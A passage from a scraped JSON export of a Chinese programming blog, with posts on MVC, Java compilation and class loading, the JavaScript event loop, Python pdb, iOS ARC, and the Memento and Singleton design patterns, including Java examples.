分析在这个最初的MVC模型中，Model层与View层是存在耦合的。 我们指定View代表UI界面，仅关注于数据的显示和与用户的交互，而Model代表业务逻辑，仅关注于对业务逻辑的处理。而两者存在耦合，则意味着复用性（Reusability）降低了，同时可维护性（Maintainability）也降低了。 因此，我们渴望存在一种更完美的MVC模式，可以解耦Model层与View层。 3 优化后的MVC同样地，优化后的Model-View-Controller (MVC)架构模式仍然包括三种角色：模型（Model）、视图（View）和控制器（Controller），且三种角色所负责的职能也并没有改变。 然而，在通信方式上进行了优化，即Controller将完全View和Model解耦了。 3.1 角色职能与上面的原始的MVC中的角色职能完全相同。 即： Models 层仅仅包括纯粹的业务逻辑（Bussiness Logic） View 层通过可视化（visual）的方式（User Interface）将用户感兴趣的数据展示出来 Controller层作为一个位于View层与Model层之间的协调者（intermediary），以处理用户的输入和交互 3.2 通信方式当用户在 View 层中触发一个行为（体现为发送一个 Request 到 Controller 的形式）时，Controller层会访问Model层（体现为调用Model层中的方法），紧接着在Model层中执行相应的业务逻辑处理，并将结果返回给Controller层。Controller层在收到结果后，将结果发给View（体现为返回一个Response的形式）。注意，这里Controller在收到Model发来的结果后，可能会对这个原始结果进行一定的处理。 View层与Model层没有直接的交互。换句话说，View层只与Controller层交互，Controller层只与Model层交互。 4 MVC在不同框架中的应用4.1 ASP.NET Web Forms ASP.NET Web Forms最初的设计思想与Windows Forms类似，即为了简化开发工作，Microsoft为我们提供了很多常用的数据显示与交互控件（比如复选框 CheckList，单选按钮框 RadioButtonList，下拉列表DropDownList等等）。 当我们通过数据绑定（Data Binding）将数据源（比如数据库，XML文件等等）与这些控件绑定后，即可实现无需编写任何代码，就可将数据在Web UI界面中显示出来。 因此，可以看出，View层与Model层是存在耦合的（因为View直接访问了数据持久化层）。 同时，在Controller管理用户的输入和交互逻辑，需要的时候还会访问Model层，最终显示一个新的View或者将处理结果反映在View中。 因此，Controller耦合于Model，也同时耦合于View。所以ASP.NET Web Forms中的MVC对应于最初提到的原始的MVC。 4.2 ASP.NET MVC在 Overview of ASP.NET Core MVC 中提到，ASP.NET Core MVC 中的 MVC 交互如下所示： 这与ASP.NET Web Forms中的MVC也是完全相同的，即都是原始的MVC。 而我认为，在实践使用中的 ASP.NET Core MVC，View往往是不直接访问Model的，而是访问Controller。 在此种情况下，View与Model就不再存在耦合了。这种实践中的MVC与上文描述的优化后的MVC是一致的。 4.3 Cocoa MVC 4.4 Java JSP在Java JSP中，MVC 是这样体现的：JSP（view） + Servlet（controller） + JavaBean（model）。 当控制器收到来自用户的请求； 控制器调用JavaBean完成业务； 完成业务后通过控制器跳转JSP页面的方式给用户反馈信息（控制器选择一个JSP（View）给用户作为响应）。 4.5 Spring MVC4.6 Ruby on Rails待补充… 5 意义5.1 前后端并行开发由于MVC解耦了前端（View）与后端（Model），前端和后端开发者可以并行的进行开发而不会发生相互阻塞（Block）对方工作的情况。 具体来说，当前后端协商并确定相互交互的数据协议（或称为数据结构，比如以一个 XML 或 JSON 的形式），前端开发者可以认为后端开发已经完成，只要根据数据协议传入指定的参数，即可得到希望得到的数据（而无需关注后端的实际开发进度）。相反，后端开发者只要根据数据协议，提供相应的数据（如以 XML 或 JSON 的形式），而无需关注数据在前端以何种形式呈现出来（从而无需关注前端的实际开发进度）。 5.2 代码复用对于前端页面（View），前端页面仅仅囊括将数据显示出来的职能（而不包括任何将数据进行提取的职能）。因此，前端页面相对更容易被复用。 类似地，对于后端API，如果希望获得特定的数据，只要请求对应的API即可（即使在不同的前端页面）。同理，复用性同样得到了提升。 6 应用MVC最初推出被应用于桌面GUIs应用，然而在不久之后也被引入到Web应用（Web Application）中。 在Web应用中，又可以将MVC应用在服务端（Server Side）或客户端（Client Side）中。 6.1 应用于服务端用户通过浏览器在View中触发一个request请求（比如，以GET 或POST的形式）发送到服务端的Controller，Controller调用Model以完成业务逻辑的处理并得到结果，并将结果返回给客户端的View，View最终将获得的结果显示出来。 将MVC应用于服务端的框架包括Django、Rails、ASP.NET MVC。 6.2 应用于客户端而在 AngularJS、 EmberJS、 JavaScriptMVC和 Backbone等框架中，所有MVC组件的交互过程仅仅只在客户端发生。 Reference A note on DynaBook requirements Model View Controller History The Evolution of MVC Trygve Reenskaug - The original MVC reports Applications Programming in Smalltalk-80 (TM): How to use Model-View-Controller (MVC) Wikipedia - MVC Cocoa Core Competencies - MVC Concepts in Objective-C Programming - MVC ASP.NET MVC 4 Overview - Web Froms 浅析前端开发中的 MVC/MVP/MVVM 模式 - https://juejin.im/post/593021272f301e0058273468","comments":true,"categories":[{"name":"ArchitecturalPattern","slug":"ArchitecturalPattern","permalink":"http://swsmile.info/categories/ArchitecturalPattern/"}],"tags":[{"name":"Architectural Pattern","slug":"Architectural-Pattern","permalink":"http://swsmile.info/tags/Architectural-Pattern/"}]},{"title":"【Java】 Intellij调试程序断点进入JDK源码","date":"2018-11-11T14:30:01.000Z","path":"2018/11/11/【Java】编译与反编译-Intellij调试程序断点进入JDK源码/","text":"需求在IntelliJ中，希望调试自己的程序时，断点能够进入JDK的源代码。 设置导入JDK源代码进入File - Project Structure - SDKs - Sourcepath - 选择本机JDK所在目录下的src.zip文件 允许断点进入JDK源码进入File - Setting - Build, Execution, Deployment - Debugger - Stepping。 去掉勾选Do not step into the classes。 尝试调试打上断点，并运行： 此时，能够进入String的substring()方法，但显示Variables debug info not available。 这是因为JDK里的代码在打包时删除了用于调试的信息（位于%JAVA_HOME%\\jre\\lib\\rt.jar），以减小安装包的体积。 我们通过重新编译JDK源代码，来获得这些调试信息。 编译过程可以参考https://stackoverflow.com/questions/18255474/debug-jdk-source-cant-watch-variable-what-it-is chenzw9547写了一个自动编译脚本同样可以作为参考。 编译完成后，将这个生成的rt-debug.jar复制到%JAVA_HOME%\\jre\\lib\\endorsed\\文件夹下（如果不存在endorsed文件夹，则新建一个）。 再次运行程序，则可以看到所有Debug信息： Reference Step through JDK source code in IntelliJ IDEA https://my.oschina.net/xionghui/blog/497361 https://stackoverflow.com/questions/18255474/debug-jdk-source-cant-watch-variable-what-it-is http://www.thejavageek.com/2016/04/03/debug-jdk-source-code/ https://github.com/chenzw9547/rt_debug/blob/master/rt_debug/rt_debug.bat","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java程序的编译与运行","date":"2018-11-11T14:23:15.000Z","path":"2018/11/11/【Java】编译与反编译-Java程序的编译与运行/","text":"本文将按照Java源代码从编译到执行的过程，进行一步一步的分析。 Java程序编译到运行过程： 一.源代码编写首先编写java源代码程序，文件扩展名：.java。 123456789101112131415161718//MainApp.java public class MainApp &#123; public static void main(String[] args) &#123; Animal animal = new Animal(&quot;SW&quot;); animal.printName(); &#125; &#125; //Animal.java public class Animal &#123; public String name; public Animal(String name) &#123; this.name = name; &#125; public void printName() &#123; System.out.println(&quot;printName：Name-&quot; + this.name); &#125; &#125; 二.编译成字节码（ByteCode）在命令行模式中，输入命令：javac 源文件名.java，会对源代码进行编译，最终生成字节码文件（.class文件）； （1）编译过程Java编译器在编译一个Java类时，会检查该类所依赖的类是否存在且已被编译： 如果存在，但是未被编译：Java编译器会先编译这个被依赖的类，然后引用 如果存在，而且已经被编译，Java编译器会直接引用 如果Java编译器在指定目录下找不到这个被依赖类所对应的.java or .class，就会报cant find symbol的错误 （2） 机器码与字节码a.机器码机器码是CPU可直接读取并运行的机器指令，运行速度非常快，且依赖于具体的硬件。 b.字节码字节码是一种中间码，它比机器码更抽象，需要编译后才能成为机器码。字节码与硬件环境无关。 （3） 字节码包含部分字节码包含以下部分组成： 结构信息包括 class 文件格式版本号及各部分的数量与大小的信息。 元数据对应于 Java 源码中声明与常量的信息。包含类/继承的超类/实现的接口的声明信息、域与方法声明信息和常量池。 方法信息对应 Java 源码中语句和表达式对应的信息。包含字节码、异常处理器表、求值栈与局部变量区大小、求值栈的类型记录、调试符号信息。 使用javap查看： 三.字节码由JVM解释执行编译完成后，如果没有报错信息，输入命令：java MainApp，JVM 对class字节码文件进行解释运行，执行时不需要添加.class扩展名。 Java类运行时，分为两个过程： 类的加载（在加载过程中，JIT编译器会将字节码编译成机器码） 类的执行 1.类的加载：（1）加载时编译在加载前，JVM中的JIT编译器会将字节码先编译： （2）懒加载类采用懒加载（Lazy Loading）的方式。 即，JVM会在类即将要被第一次使用时，才加载它（此后一直保留在内存中）。而不是一开始，就把程序中的所有类都加载到内存中。 （3）加载机制JVM 的类加载是通过 ClassLoader 及其子类来完成的，类的加载顺序和加载检查顺序如下所示： a.Bootstrap ClassLoader负责加载$JAVA_HOME中jre/lib/rt.jar里所有的 class，由 C++ 实现，不是 ClassLoader 子类。 b.Extension ClassLoader负责加载Java平台中扩展功能的一些 jar 包，包括$JAVA_HOME中jre/lib/*.jar或-Djava.ext.dirs指定目录下的 jar 包。 c.App ClassLoader负责记载 classpath 中指定的 jar 包及目录中 class。 d.Custom ClassLoader属于应用程序根据自身需要自定义的 ClassLoader，如 Tomcat、jboss 都会根据 J2EE 规范自行实现 ClassLoader。 加载过程中会先检查类是否被已加载，检查顺序是自底向上，从 Custom ClassLoader 到 BootStrap ClassLoader 逐层检查，只要某个 Classloader 已加载就视为已加载此类，保证此类只所有 ClassLoade r加载一次。而加载的顺序是自顶向下，也就是由上层来逐层尝试加载此类。 2.类的执行（1）javac编译得到 MainApp.class 文件后（2）输入java AppMain系统会启动一个JVM进程，JVM进程从ClassPath路径中找到一个名为 MainApp.class 的二进制文件。 （3）加载MainApp类将 MainApp 类的字节码通过JIT编译器编译后，加载到运行时的代码区 （4）JVM 找到 AppMain 的主函数入口，开始执行main函数。（5）执行Animal animal = new Animal(&quot;SW&quot;); JVM发现，此时代码区中并没有Animal类。因此将Animal类的字节码通过JIT编译器编译后，存储于运行时的代码区。 在堆（Heap）中为一个新的Animal对象分配空间，animal 指向这块在堆中的内存区域 （6）执行animal.printName()animal.printName(); JVM根据 animal 引用，找到在堆中的 Animal 对象，然后根据该对象定位到方法区中Animal 类的类型信息的方法表，获得printName()函数的字节码地址。 执行printName()函数 参考 Java程序编译和运行的过程 http://wiki.jikexueyuan.com/project/java-vm/java-debug.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【JavaScript】JavaScript 单线程与异步","date":"2018-11-11T14:20:38.000Z","path":"2018/11/11/【JavaScript】JavaScript-单线程与异步/","text":"JavaScript 单线程设计JavaScript 的一个很重要的特性就是单线程，即同一个时间点只能够做一件事情。我们不禁会问，为什么不把 JavaScript 设计成多线程呢？ 按照最朴素的想法来理解，多线程可以充分使用多核CPU的计算资源，这样程序的执行效率不是应该更高吗？ 然而，这就是 JavaScript 设计的巧妙之处。作为运行在浏览器宿主上的脚本语言，JavaScript 主要用于高效的处理与用户的交互，具体来说是根据用户的特定操作触发相应的业务逻辑、操作DOM。 基于这个特点，如果将 JavaScript 设计成可支持多线程，则需要引入复杂的多线程同步机制，这违背了 JavaScript 尽可能简单的核心特征。 若不引入线程同步机制，一个线程在某个DOM元素上添加内容，而另一个线程在这个元素上删除内容，这时候浏览器应该以哪个线程的操作为准呢？ 关于浏览器的多线程与JavaScript的单线程JavaScript的单线程因为JavaScript运行在浏览器中，这里的单线程其实是指：每个 window 有且只有一个 JavaScript 线程。 这意味着，若一个浏览器打开了多个window，则会存在多个JavaScript 线程，但是这些多个JavaScript 线程是完全没有交集而独立运行的。 以 Chrome 浏览器中为例，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程。 浏览器不是单线程的因为JavaScript运行在浏览器中，每个window只有一个JavaScript 线程。 但是浏览器却不是单线程的，而是多线程的，具体可能包括以下线程（不同浏览器的实现各有不同）： GUI界面渲染线程 主要负责页面的渲染，解析 HTML、CSS，构建 DOM 树，布局和绘制等。 当界面需要重绘或者由于某种操作引发回流时，将执行该线程。 该线程与 JavaScript 引擎线程互斥，当执行 JavaScript 引擎线程时，GUI 渲染会被挂起，当任务队列空闲时，JavaScript 引擎才会去执行 GUI 渲染。 JavaScript引擎线程 该线程当然是主要负责处理 JavaScript 脚本，执行代码。 也是主要负责执行准备好待执行的回调函数事件，比如，定时器计数结束，或者异步请求成功并正确返回时，对应的回调函数被放入任务队列，等待 JavaScript 引擎线程的最终执行。 提的一提的是，该线程与 GUI 渲染线程互斥。因此，当 JavaScript 引擎线程执行 JavaScript 脚本时间过长，将导致页面渲染的阻塞。 定时器计数线程 主线程依次执行代码时，遇到定时器，会将定时器交给该线程处理，当计数完毕后，定时器计数线程会将计数完毕后的事件加入到任务队列的尾部，等待 JavaScript 引擎线程执行。 浏览器事件触发线程 负责响应各种事件（比如 setTimeout 定时器计数结束， ajax 等异步请求成功并触发回调函数，或者用户触发点击事件时），并将对应的回调函数依次加入到任务队列的队尾，等待 JavaScript 引擎线程的执行。 异步HTTP请求线程 负责执行异步请求一类的函数的线程，如： Promise，axios，ajax 等。 主线程依次执行代码时，遇到异步请求，会将函数交给该线程处理，当监听到状态码变更，如果有回调函数，事件触发线程会将回调函数加入到任务队列的尾部，等待 JavaScript 引擎线程执行。 比如，在通过XMLHttpRequest发送Request时，浏览器会新开一个线程（以处理网络请求）。 当网络请求的状态变化时，且之前已设置了回调函数。这个回调函数任务就被添加到等待JavaScript线程执行的消息队列中。 当请求结束后，该线程可能就会被销毁。 任务队列（Task Queue/Callback Queue ）单线程意味着，只有当前一个任务（一个任务可以理解为一个函数或一个函数组）执行完成，才会执行后一个任务。如果前一个任务执行的时间很长，那后一个待执行任务就不得不一直等着了。 如果是因为前一个任务执行过程中的计算量比较大，导致后一个任务被阻塞了，那还勉强可以理解。 但是，大部分情况往往都是因为任务在执行I/O操作（比如磁盘读写、网络传输），导致当前任务和后面的任务被阻塞了（而被阻塞时，CPU是闲着的）。 因此，JavaScript 的设计者意识到，当进行类似I/O操作这样耗时的操作时，采取挂起当前等待任务的策略，而先去执行后面的任务。当这些等待任务已经得到了结果（比如，对于磁盘操作来说，已经将数据从硬盘读取到了内核缓存区），再在合适的时机执行他们（什么叫“合适的时机”接下来会解释）。 任务队列（Task Queue），也可以成为回调队列（Callback Queue），本质上是一个用于管理回调函数调用的FIFO（First In, First Out，先进先出）的队列（Queue）。 任务类型于是，在JavaScript中，所有的任务就分为了以下两种： 同步任务（synchronous task）在主线程上排队且依次被执行的任务。这意味着这种任务可能会阻塞其他任务的执行（当这个任务的执行时间很长时）。 异步任务（asynchronous task）异步任务通常暗指其包括一个回调函数（Callback）。 当异步任务执行后，不会等待到其对应的回调操作可以被执行，而是立即开始执行主线程执行栈（Call Stack）中的下一个任务。 当主线程执行栈中不存在任务时，才依次执行任务队列（Task Queue）中的异步回调操作。 特点 异步任务一定包含一个回调函数（Callback），当执行条件满足时，对应的回调函数任务将被添加到任务队列（Task Queue）中（若任务队列中没有其他任务，则这个回调函数任务会被立即执行）。 比如，发送Ajax请求，当Response已经收到且状态正常时（这里发生了一个事件），对应的回调函数就会立即被放入任务队列（但不一定会被立即执行） 又比如，通过setInterval间隔触发一个任务，当时间到达时（执行条件满足），将这个任务添加到任务队列中 只有当这个任务所在的任务队列中没有其他任务了，且主线程执行栈中也没有任务时（这就是上文所谓的合适的时机），这个异步任务对应的回调函数才会进入主线程被执行。 类型 调用setInterval、setTimeout触发的任务。当到达指定时间时，该任务就会被放入任务队列 DOM 元素的 Event Listeners触发的任务。比如在一个Button上绑定了一个onclick事件，当用户click时，指定的任务就会被添加到任务队列 发送一个Ajax请求，当Response已经收到且状态正常（stateCode = 200）时（这里发生了一个事件），才将回调函数添加到任务队列 事件循环（Event Loop）执行栈（Call Stack） 在主线程上，存在一个执行栈（Call Stack） 所有的同步任务都在主线程上执行 主线程外，存在一个任务队列（Task Queue）。当异步任务执行条件满足时，就向任务队列添加一个新回调任务 只有当执行栈中无执行任务时（主线程空闲），系统才会读取任务队列中任务，并进行执行。否则任务队列中任务一直不会被执行 事件循环（Event Loop）主线程在空闲时，从任务队列中读取任务以执行，这个过程是不断循环的，整个运行机制又称为事件循环（Event Loop）。 Reference JavaScript 运行机制详解：再谈Event Loop - http://www.ruanyifeng.com/blog/2014/10/event-loop.html 《Help, I’m stuck in an event-loop》 - https://vimeo.com/96425312 Understanding Javascript Function Executions — Call Stack, Event Loop , Tasks &amp; more - https://medium.com/@gaurav.pandvia/understanding-javascript-function-executions-tasks-event-loop-call-stack-more-part-1-5683dea1f5ec What the heck is the event loop anyway? | Philip Roberts | JSConf EU - https://www.youtube.com/watch?v=8aGhZQkoFbQ Understanding the JavaScript call stack - https://medium.freecodecamp.org/understanding-the-javascript-call-stack-861e41ae61d4 浏览器与Node的事件循环(Event Loop)有何区别? - https://blog.fundebug.com/2019/01/15/diffrences-of-browser-and-node-in-event-loop/ 深入理解js事件循环机制（浏览器篇）- http://lynnelv.github.io/js-event-loop-browser","comments":true,"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/tags/JavaScript/"}]},{"title":"【Python】Python调试技巧","date":"2018-11-11T14:01:49.000Z","path":"2018/11/11/【Python】Python调试技巧/","text":"1 The Python DebuggerPDB，即The Python Debugger，是一个可对源代码进行交互调试的Python调试工具。 增加断点 增加的方法12345# 需要引入pdbimport pdb# 增加断点pdb.set_trace() 运行结果当添加pdb.set_trace()后，执行python test1.py，Python解释器会自动执行到 pdb.set_trace() 所在的这一行（下一行b = &quot;bbb&quot;未执行），并且进入pdb调试模式： pdb 常用命令 命令 意义 c 继续执行程序 s或step 进入函数 exit 或 q 中止并退出 next 或 n 执行下一行 step 或 s 进入函数 p + 变量名 打印变量值 help 帮助 list 显示当前执行到的代码 Reference The Python Debugger - https://docs.python.org/3/library/pdb.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【iOS】 iOS内存管理","date":"2018-11-11T13:57:12.000Z","path":"2018/11/11/【iOS】iOS内存管理/","text":"之前接手公司的一个iOS SDK项目，是用MRC进行内存管理的。最终，我将这个项目迁移成了ARC。 苹果在 2011 年的时候，在 WWDC 大会上提出了自动的引用计数（ARC）。ARC 背后的原理是依赖编译器的静态分析能力，通过在编译时找出合理的插入引用计数管理代码，从而彻底解放程序员。 在 ARC 刚刚出来的时候，业界对此黑科技充满了怀疑和观望，加上现有的 MRC 代码要做迁移本来也需要额外的成本，所以 ARC 并没有被很快接受。直到 2013 年左右，苹果认为 ARC 技术足够成熟，直接将 macOS（当时叫 OS X）上的垃圾回收机制废弃，从而使得 ARC 迅速被接受。 2014 年的 WWDC 大会上，苹果推出了 Swift 语言，而该语言仍然使用 ARC 技术，作为其内存管理方式。 如今，使用XCode生成的项目，都是使用ARC作为内存管理的默认方法了。但是，我们仍需要了解，ARC背后的原理。 一.什么是引用计数引用计数（Reference Count）是一个简单而有效的管理对象生命周期的方式。当我们创建一个新对象的时候，它的引用计数为 1，当有一个新的指针指向这个对象时，我们将其引用计数加 1，当某个指针不再指向这个对象是，我们将其引用计数减 1，当对象的引用计数变为 0 时，说明这个对象不再被任何指针指向了，这个时候我们就可以将对象销毁，回收内存。由于引用计数简单有效，除了 Objective-C 和 Swift 语言外，微软的 COM（Component Object Model ）、C++11（C++11 提供了基于引用计数的智能指针 share_prt）等语言也提供了基于引用计数的内存管理方式。 ARCARC本质还是MRC，只是retain和release的过程由编译器为你完成了，如果你写的不好，依然会内存泄漏，而学会MRC可以帮助你分析内存泄漏原因 混合使用MRC、ARC方法就是在Build Phase里面的Compile Source里面找到需要特殊处理的文件，加上编译选项(Compiler Flags)，具体针对上面两种情况有所区别。 旧项目没有使用ARC，引入的第三方库使用了ARC的，给要添加的ARC源文件，添加-fobjc-arc选项 新项目使用了ARC，引入的第三方库没有使用ARC，给引入的第三方库添加-fno-objc-arc 参考 理解 iOS 的内存管理","comments":true,"categories":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/categories/iOS/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/tags/iOS/"}]},{"title":"【Design Pattern】行为类模式 -- 备忘者模式（Memento Pattern)","date":"2018-11-11T13:53:04.000Z","path":"2018/11/11/【Design-Pattern】行为类模式-备忘者模式-（Memento-Pattern/","text":"1 动机备忘录模式（Memento Pattern），又称为快照模式（Snapshot Pattern），为对象提供了恢复到先前状态的能力（通过回滚（rollback））。 一个典型的例子是文本编辑器（text editor）可以在任何时刻保存，并且使用撤销（undo）来撤回到先前的保存状态。 2 定义备忘录模式（Memento Pattern）是在不破坏封装的前提下，获取一个对象的内部状态，并将这个状态保存在这个对象之外，以实现在未来将对象恢复到先前状态的一种模式。 常见的软件系统往往不止存储一个状态，而是需要存储多个状态。这些状态常常是一个对象历史发展的不同阶段的快照，存储这些快照的备忘录对象叫做对象的历史；某一个快照所处的位置叫做检查点（Check Point）。 3 构成 发起者角色（Originator）：它的状态会被保存起来。而保存机制通过使用一个内部类（inner class）来实现，这个内部类就是备忘录角色（Memento），备忘录角色被定义在发起者内部。 负责者角色（Caretaker）：帮助存储和恢复发起者的状态。Caretaker会在内部维护一个状态池（用于保存每一次发起者的状态）。 备忘录角色（Memento）：每一次保存，发起者的状态都会被保存在一个备忘录角色的实例中。它是一个内部类，因此它不能被（除发起者外的）任何类访问。 交互 每一次调用负责者以保存Originator的状态，负责者都会将FileWriterUtil的当前状态存储于一个备忘录角色对象中。若保存了5次，则会有5个备忘录角色实例。 每一次调用负责者以撤回，都会从在状态池中获取先前存储的Memento对象（表示当时的那个状态），并改写Originator对象。 UML图 发起者角色（Originator）12345678910111213141516171819202122232425262728class Originator &#123; private String state; public String getState() &#123; return state; &#125; public void setState(String state) &#123; this.state = state; &#125; public Originator(String state) &#123; this.state = state; &#125; /** * 工厂方法，返还一个新的备忘录对象 */ public Memento createMemento() &#123; return new Memento(this.state); &#125; public void restoreMemento(Memento memento) &#123; Memento m = (Memento) memento; this.setState(m.getSavedState()); &#125;&#125; 负责者角色（Caretaker）备忘录角色（Memento）4 示例我们实现一个可以撤回的文本编辑器以作为例子。每次保存时，都会将文本内容写入文件中。 注意，为了尽可能简化实现而突出问题实质，将文本写入文件的逻辑在以下实现中省略了。 UML图 实现思路 FileWriterCaretaker 类对应Caretaker角色，为调用者提供接口，用于保存或撤回（恢复先前状态）。 FileWriterUtil表示当前文本 Memento表示每一次保存时，文本的状态 Originator 和内部类Memento12345678910111213141516171819202122232425262728293031323334353637383940class FileWriterUtil &#123; private String fileName; private StringBuilder content; public FileWriterUtil(String file) &#123; this.fileName = file; this.content = new StringBuilder(); &#125; @Override public String toString() &#123; return this.content.toString(); &#125; public void write(String str) &#123; content.append(str); &#125; public Memento save() &#123; return new Memento(this.fileName, this.content); &#125; public void undoToLastSave(Object obj) &#123; Memento memento = (Memento) obj; this.fileName = memento.fileName; this.content = memento.content; &#125; private class Memento &#123; private String fileName; private StringBuilder content; public Memento(String file, StringBuilder content) &#123; this.fileName = file; //notice the deep copy so that Memento and FileWriterUtil content variables don't refer to same object this.content = new StringBuilder(content); &#125; &#125;&#125; Caretaker123456789101112class FileWriterCaretaker &#123; private Object obj; public void save(FileWriterUtil fileWriter) &#123; this.obj = fileWriter.save(); &#125; public void undo(FileWriterUtil fileWriter) &#123; fileWriter.undoToLastSave(obj); &#125;&#125; 调用者调用代码1234567891011121314151617181920212223242526public class Client &#123; public static void main(String[] args) &#123; FileWriterCaretaker caretaker = new FileWriterCaretaker(); FileWriterUtil fileWriter = new FileWriterUtil(\"data.txt\"); fileWriter.write(\"First Set of Data\\n\"); System.out.println(fileWriter + \"\\n\"); // lets save the file caretaker.save(fileWriter); //now write something else fileWriter.write(\"Second Set of Data\\n\"); //checking file contents System.out.println(fileWriter + \"\\n\"); //lets undo to last save caretaker.undo(fileWriter); //checking file content again System.out.println(fileWriter + \"\\n\"); &#125;&#125; 输出12345678/* output:First Set of DataFirst Set of DataSecond Set of DataFirst Set of Data*/ 分析 FileWriterUtil对象表示当前的文本 每一次调用FileWriterCaretaker以保存FileWriterUtil的状态，FileWriterCaretaker都会将FileWriterUtil的当前状态存储于一个Memento对象中。若保存了5次，则会有5个Memento实例 每一次调用Caretaker以撤回，都会从在状态池中获取先前存储的Memento对象（表示当时的那个状态），并改写FileWriterUtil对象 在上面例子的Caretaker中，private Object obj;的声明决定了只会恢复到上一次的状态（撤销一次）。若希望允许多次撤销），则可以修改为private List&lt;Object&gt; obj;以保存多次状态 在上面的例子中，我们采用深拷贝（deep copy）的方式来保存文本的状态，以避免数据完整性问题 在上面的例子中，我们简单粗暴地采取了全量存储状态的方式，若当前文本对象较大，这样的做法是极为消耗内存的。取而代之，我们可以采取增量存储的方式来作为实现的优化 模式的优缺点优点 给用户提供了一种可以恢复状态的机制。可以是用户能够比较方便地回到某个历史的状态。 实现了信息的封装。使得用户不需要关心状态的保存细节。 缺点消耗资源。如果类的成员变量过多，势必会占用比较大的资源，而且每一次保存都会消耗一定的内存。 模式适用场景 需要保存一个对象在某一个时刻的状态或部分状态。 如果用一个接口来让其他对象得到这些状态，将会暴露对象的实现细节并破坏对象的封装性，一个对象不希望外界直接访问其内部状态，通过负责人可以间接访问其内部状态。 Reference 《Java与模式》 Design Patterns: Elements of Reusable Object-Oriented Software JournalDev - Memento Design Pattern in Java - https://www.journaldev.com/1734/memento-design-pattern-java https://github.com/iluwatar/java-design-patterns/tree/master/memento 设计模式读书笔记——备忘录模式 - https://www.cnblogs.com/chenssy/p/3341526.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】创建类模式 -- 单例模式 (Singleton Pattern)","date":"2018-11-11T13:48:17.000Z","path":"2018/11/11/【Design-Pattern】创建类模式-单例模式-Singleton-Pattern/","text":"1 动机在涉及同步问题的日志模块、缓存模块、多线程或线程池设计过程中，对于系统中的某些类来说，只有一个实例很重要。 如何保证一个类只有一个实例？定义一个全局变量并声明一个public方法以提供访问该全局变量的接口，可以确保该全局变量可被任何对象访问到，但缺不一定能保证该全局变量只被实例化一次。 一个更好的解决方案是让这个类自己负责该全局变量的实例化工作，并提供一个访问该全局变量的接口。这就是单例模式的动机。 2 定义单例模式（Singleton Pattern）确保某一个类只有一个实例，且由这个类本身管理实例实例化的过程，并提供一个接口以允许整个系统访问这个实例，这个类称为单例类， 3 特点 某个类只有一个实例 类自身管理实例实例化的过程 提供接口以允许整个系统访问这个实例 4 构成 单例模式只包含一个角色，即单例类自身 单例类包含一个私有（private）的构造函数，以保证用户无法通过new关键字直接实例化它 单例类还包含一个静态（static）私有成员变量，和一个静态的公有（public）方法 该静态公有方法提供对单例对象的全局访问，并负责检查实例的存在性（若不存在则实例化单例对象，并保存在私有成员变量中），以保证整个系统中只有一个实例被创建了 5 示例错误的实现[Bad implementation] - 懒汉式，线程不安全当被问到要实现一个单例模式时，很多人的第一反应是写出如下的代码，包括教科书上也是这样教我们的。 1234567891011public class Singleton &#123; private static Singleton instance; private Singleton ()&#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 这段代码简单明了，而且使用了懒加载模式，但是却存在致命的问题。 在多线程情况下，如果多个线程同时调用getInstance()的话，那么，可能会有多个进程同时通过 (singleton== null)的条件检查，于是，多个实例（通过new Singleton()）就创建出来，并且很可能造成内存泄露问题。嗯，熟悉多线程的你一定会说——“我们需要线程互斥或同步”。 待优化的实现[Bad implementation] - 懒汉式，线程安全为了解决上面的问题，最简单的方法是将整个 getInstance() 方法设为同步（synchronized）。 123456789public class Singleton &#123; private static Singleton instance; public static synchronized Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 虽然做到了线程安全，并且解决了多实例的问题，但是它并不高效（虽然它的实现是完成正确的）。因为在任何时候只能有一个线程调用 getInstance() 方法。但是同步操作只需要在第一次调用时才被需要，即第一次创建单例实例对象时。这就引出了双重检验锁。 正确的实现双重检验锁（double-check locking）双重检验锁模式（double checked locking pattern），是一种使用同步块加锁的方法。程序员称其为双重检查锁，因为会有两次检查 instance == null，一次是在同步块外，一次是在同步块内。为什么在同步块内还要再检验一次？因为可能会有多个线程一起进入同步块外的 if，如果在同步块内不进行二次检验的话就会生成多个实例了。 1234567891011121314public class Singleton &#123; private static Singleton instance; private Singleton() public static Singleton getSingleton() &#123; if (instance == null) &#123; //Single Checked synchronized (Singleton.class) &#123; if (instance == null) &#123; //Double Checked instance = new Singleton(); &#125; &#125; &#125; return instance; &#125;&#125; 这段代码看起来很完美，很可惜，它是有问题。主要在于instance = new Singleton()这句，这并非是一个原子操作，事实上在 JVM 中这句话大概做了下面 3 件事情： 给 Singleton对象实体在堆（heap）中分配内存 调用 Singleton 的构造函数来初始化Singleton对象实体的成员变量 将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了） 但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。 我们只需要将 instance 变量声明成 volatile 就可以了。 12345678910111213141516public class Singleton &#123; private volatile static Singleton instance; //声明成 volatile private 